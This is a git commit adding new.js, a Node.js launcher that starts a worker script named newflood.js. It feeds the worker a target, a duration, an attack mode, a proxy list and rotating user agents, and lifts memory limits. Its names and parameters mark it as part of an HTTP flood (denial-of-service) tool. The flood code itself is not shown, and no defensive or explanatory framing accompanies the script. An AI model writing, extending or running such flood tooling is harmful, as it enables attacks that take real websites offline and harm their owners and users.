fb4cd7b6a393a84ecea7ff0c10ef3e2c1d2169bd
AntiAzer <73966459+AntiAzer@users.noreply.github.com>
2021-08-03 22:36:13 +0300

    Add files via upload

---
+++ new.js
@@ -0,0 +1,28 @@
+const {
+    Worker
+} = require('worker_threads'), fs = require('fs');
+new Worker('./newflood.js', {
+    workerData: {
+        target: process.argv[2],
+        proxies: [...new Set(fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'))],
+        userAgents:[...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
+        referers: [],
+        duration: process.argv[3] * 1e3,
+        opt: { ratelimit: false },
+        mode: process.argv[4]
+    },
+    resourceLimits: {
+        maxOldGenerationSizeMb: Infinity,
+        maxYoungGenerationSizeMb: Infinity,
+        codeRangeSizeMb: Infinity
+    }
+}).on('exit', code => {
+    if (code) {
+        switch (code) {
+            case '20':
+                //Target with too big body, blacklist the target.
+
+                break;
+        }
+    }
+}).setMaxListeners(0);
